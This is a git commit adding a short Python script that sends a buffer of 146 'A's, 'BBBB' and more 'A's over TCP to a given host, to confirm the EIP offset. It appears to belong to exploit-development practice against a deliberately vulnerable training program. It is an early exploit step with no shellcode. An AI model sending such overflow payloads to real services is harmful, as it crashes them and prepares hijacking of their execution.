6fb11bb02e7e777a9af6b76730f8b4a4421d3fb5
danilofernassis <danilofernassis@gmail.com>
2021-05-12 23:17:14 -0300

    First Commint

---
+++ Buffer_Overflow/dostackbufferoverflowgood/eip_offset.py
@@ -0,0 +1,26 @@
+import socket
+import sys
+
+# how to execute:
+# python overflow.py 192.168.1.109 31337
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
+
+junk = ("A" * 146)
+
+eip = "BBBB"
+
+exploit = junk + eip + junk
+
+# sending junk
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        print("Fuzzing: " + str(len(exploit)))
+        s.send(exploit + "\n")
+        s.recv(1024)
+        s.close()
+    except:
+        sys.exit(0)
